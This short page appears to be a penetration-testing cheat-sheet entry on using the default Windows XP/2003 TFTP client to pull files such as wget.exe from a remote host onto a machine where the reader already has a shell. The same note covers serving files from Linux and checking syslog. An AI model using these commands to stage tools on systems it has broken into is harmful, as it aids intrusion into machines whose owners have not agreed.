<title>TFTP</title>
</head><body>Works by default on:<br/>
Windows XP<br/>
Windows 2003<br/>
<br/>
A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.<br/>
<br/>
You can upload and download whatever from the windows-machine like this<br/>
tftp -i 192.160.1.101 GET wget.exe<br/>
tftp -i 192.160.1.101 GET wget.exe .\path\new_filename.exe<br/>
<br/>
If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.<br/>
tftp 192.160.1.101<br/>
GET test.txt<br/>
<br/>
I usually put all files I want to make available in /srv/tftp<br/>
If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:<br/>
grep 192.168.1.101 /var/log/syslog</body></html>
